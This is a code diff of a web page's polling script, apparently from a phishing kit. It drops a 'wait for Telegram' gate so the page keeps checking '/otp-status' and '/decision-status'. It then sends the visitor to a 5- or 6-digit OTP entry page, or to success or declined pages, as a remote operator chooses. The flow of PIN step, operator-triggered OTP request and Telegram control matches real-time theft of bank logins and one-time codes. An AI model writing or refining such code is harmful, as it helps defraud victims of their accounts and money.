@@ -39,38 +39,48 @@ if (localStorage.getItem("firstProcess") === "yes") {
 }
 
 // ===============================
-// SECOND → WAIT FOR TELEGRAM
+// ALWAYS POLL (no localStorage gate)
 // ===============================
-if (localStorage.getItem("fromPin") === "yes") {
-
-    setInterval(() => {
-
+const interval = setInterval(async () => {
+    try {
         // 🔹 CHECK OTP
-        fetch("/otp-status")
-        .then(res => res.json())
-        .then(data => {
-            if (data.otp === 5 || data.otp === 6) {
-                localStorage.setItem("otpLength", data.otp);
-                localStorage.removeItem("fromPin");
-                window.location.href = "step6.html";
-            }
-        });
+        const otpRes = await fetch("/otp-status");
+        const otpData = await otpRes.json();
+
+        console.log("OTP STATUS:", otpData);
+
+        if (Number(otpData.otp) === 5) {
+            clearInterval(interval);
+            window.location.href = "step5.html";
+            return;
+        }
+
+        if (Number(otpData.otp) === 6) {
+            clearInterval(interval);
+            window.location.href = "step6.html";
+            return;
+        }
 
         // 🔹 CHECK DECISION
-        fetch("/decision-status")
-        .then(res => res.json())
-        .then(data => {
-            if (data.decision === "accept") {
-                window.location.href = "success.html";
-            }
+        const decisionRes = await fetch("/decision-status");
+        const decisionData = await decisionRes.json();
 
-            if (data.decision === "decline") {
-                window.location.href = "declined.html";
-            }
-        });
+        console.log("DECISION:", decisionData);
 
-    }, 2000);
-}
+        if (decisionData.decision === "accept") {
+            clearInterval(interval);
+            window.location.href = "success.html";
+        }
+
+        if (decisionData.decision === "decline") {
+            clearInterval(interval);
+            window.location.href = "declined.html";
+        }
+
+    } catch (err) {
+        console.log("Waiting...");
+    }
+}, 2000);
 </script>
 
 </body>
